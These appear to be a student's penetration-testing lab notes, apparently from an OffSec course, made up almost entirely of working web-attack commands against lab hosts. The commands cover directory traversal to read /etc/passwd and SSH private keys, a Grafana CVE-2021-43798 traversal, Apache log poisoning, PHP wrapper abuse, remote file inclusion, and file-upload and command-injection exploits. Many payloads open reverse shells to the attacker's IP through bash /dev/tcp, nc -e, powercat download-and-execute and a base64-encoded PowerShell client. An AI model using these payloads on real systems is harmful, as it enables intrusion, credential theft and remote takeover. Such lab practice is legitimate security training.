web root - /var/www/html/
```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
ssh -i desserts_key -p 2222 offsec@mountaindesserts.com
```

exploit this CVE https://github.com/taythebot/CVE-2021-43798
get this file:  C:\Users\install.txt.
```
curl --path-as-is http://192.168.234.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt

curl http://192.168.234.16/cgi-bin/../../../../etc/passwd
curl http://192.168.234.16/cgi-bin/../../../../../../../../../../etc/passwd
curl http://192.168.234.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

curl --path-as-is http://192.168.234.16:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### local file inclusion - execute instead of just list
```
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```

first add to user agent in burp
```
<?php echo system($_GET['cmd']); ?>
User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
```

then after sending the request, remove that and add a cmd to execute
```
GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la HTTP/1.1
```

update cmd to get a reverse shell
```
bash -i >& /dev/tcp/97.113.193.84/4444 0>&1
```

make sure it uses bash
```
bash -c "bash -i >& /dev/tcp/97.113.193.84/4444 0>&1"
```

url encoding - use IP from tun0 in ifconfig
```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.194%2F4444%200%3E%261%22
```

before sending the request in burp, set up a listener to catch the reverse shell
```
nc -nvlp 4444
```

```
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../opt/admin.bak.php

curl http://192.168.234.193/meteor/index.php?page=../../../../../../../../../xampp/apache/logs/access.log
page=../../../../../../../../../xampp/apache/logs/access.log&cmd=dir
cmd=more%20css/fonts/hopefullynobodyfindsthisfilebecauseitssupersecret.txt cmd=dir%20/s%20css 

curl http://192.168.234.193/xampp/htdocs/meteor/css/fonts/hopefullynobodyfindsthisfilebecauseitssupersecret.txt
cmd=dir%20/s%20css 
```
# PHP filters

filter wrapper can include the contents of a file
```
curl http://mountaindesserts.com/meteor/index.php?page=admin.php
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

data wrapper can do code execution
```
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

if there are security measures in place, base64 encode the command
```
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a"
```
### remote file inclusion

webshells are located at /usr/share/webshells/php/ on kali
```
cat simple-backdoor.php
```
# make the remote file available
```
kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
```

connect to our kali
```
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.194/simple-backdoor.php&cmd=ls"
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.194/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"
````

serve up a reverse shell script
- Download https://pentestmonkey.net/tools/web-shells/php-reverse-shell
- cd into the directory and serve up with python server
```
python3 -m http.server 80
```

set up a listener to catch the shell
```
nc -nvlp 4444
```

curl for the file you served up to initiate connection to shell
```
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.194/php-reverse-shell.php"
```

### file upload vulnerabilities
```
curl http://192.168.229.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
```

start up listener for reverse shell
```
nc -nlvp 4444
```

get reverse shell from powershell base 64 encoded
```
pwsh # to run powershell on kali
```

in powershell
```
$Text = '$client = New-Object System.Net.Sockets.TCPClient("10.10.110.147",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
exit

curl http://192.168.229.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

### non executable file upload vulnerabilities
- create an ssh key
- upload that ssh key
- intercept with burp
- change the filename in burp to ../../../../../../../root/.ssh/authorized_keys
- forward or send this request
- this allows us to then go and ssh to root@host with the key we just created

### command injection
```
curl -X POST --data 'Archive=ipconfig' http://192.168.229.189:8000/archive
curl -X POST --data 'Archive=git' http://192.168.229.189:8000/archive
curl -X POST --data 'Archive=git version' http://192.168.229.189:8000/archive
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.229.189:8000/archive
```

is it executed by cmd or powershell?
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.229.189:8000/archive
```

use powercat reverse shell 
```
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```

serve it up with python server
```
python3 -m http.server 80
```

also start up a listener for reverse shell
```
nc -nlvp 4444
```

```IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.194%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.194%20-p%204444%20-e%20powershell' http://192.168.229.189:8000/archive```
```

connect to our reverse shell remotely - linux version
```
nc 192.168.45.194 4444 -e /bin/bash
nc%20192.168.45.194%204444%20-e%20%2Fbin%2Fbash
curl -X POST --data 'Archive=git%3Bnc%20192.168.45.194%204444%20-e%20%2Fbin%2Fbash' http://192.168.229.16/archive
```
### vm 3
```
nmap 192.168.229.16
```

once ports found. look for list of files
```
gobuster dir -u http://192.168.229.16:80 -w /usr/share/wordlists/dirb/big.txt -p pattern
curl -X POST --data 'username=test&password=test&ffa=stest%22%26%26bash -c 'bash -i >& /dev/tcp/192.168.45.194/4444 0>&1'%22' http://192.168.229.16/login

curl -X POST --data 'username=test&password=test&ffa="| /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.45.194/4444 0>&1" #' http://192.168.229.16/login

| /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.45.194/4444 0>&1"
something"&&bash -c "bash -i >& /dev/tcp/192.168.45.194/4444 0>&1""
"&&bash -c "bash -i >& /dev/tcp/192.168.45.194/4444 0>&1""
something"&&bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.194%2F4444%200%3E%261%22"
```

- url encoder - https://www.urlencoder.org/
- xss payloads - https://github.com/payloadbox/xss-payload-list
- payloads to test - https://github.com/payloadbox/command-injection-payload-list
- reverse shell cheat sheet - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

solution: put this into intercept
```
test%22%26%26bash -c %22bash -i >& /dev/tcp/192.168.45.194/4444 0>&1%22%22
```
### vm 4
```
nmap 192.168.206.192
sudo nmap -p80 -sV 192.168.206.192
gobuster dir -u http://192.168.206.192:80 -w /usr/share/wordlists/dirb/big.txt -p pattern
sudo nmap -p80 --script=http-enum 192.168.206.192
sudo nmap -p80 --script=url-snarf 192.168.206.192
nmap -p 445 --script smb-enum-shares 192.168.206.192
```

file upload
```
http://192.168.229.192:8000/default/v2

/Default?cmd=dir?MAIN=%7c%20echo%20%22%3c%3fphp%20system($_GET['cmd'])%7c%20%3f%3e%22%20%3e%20cmd%2ephp 

bash -i >& /dev/tcp/192.168.45.194/4444 0>&1
0<&196;exec 196<>/dev/tcp/192.168.45.194/4444; sh <&196 >&196 2>&196
/bin/bash -l > /dev/tcp/192.168.45.194/4444 0<&1 2>&1
```